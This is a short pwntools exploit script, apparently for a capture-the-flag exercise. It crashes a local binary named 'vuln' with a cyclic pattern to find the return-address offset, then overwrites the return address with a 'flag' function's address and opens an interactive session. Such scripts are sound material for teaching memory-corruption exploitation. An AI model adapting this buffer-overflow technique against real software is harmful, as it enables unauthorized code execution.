from pwn import *

# Setup context
context.binary = './vuln'
context.terminal = ['tmux', 'splitw', '-h']

# Load binary
elf = ELF('./vuln')

# Step 1: Generate a cyclic pattern to determine the offset
p = process('./vuln')
cyclic_pattern = cyclic(100)  # Generate a pattern larger than the buffer size
print(p.recvline().decode())  # Receive initial output
p.sendline(cyclic_pattern)  # Send the cyclic pattern
p.wait()  # Wait for the program to crash
core = p.corefile  # Extract core dump
eip_offset = cyclic_find(core.eip)  # Find the offset where EIP is overwritten
log.info(f"Offset to EIP: {eip_offset}")

# Step 2: Construct the final exploit payload
flag_addr = elf.symbols['flag']  # Address of the flag function

# Payload
payload = b'A' * eip_offset  # Fill up to the return address
payload += p32(flag_addr)  # Overwrite EIP with the flag function's address

# Step 3: Run the exploit with the correct payload
p = process('./vuln')
print(p.recvline().decode())  # Receive initial output
p.sendline(payload)  # Send the payload
p.interactive()  # Interact to confirm exploitation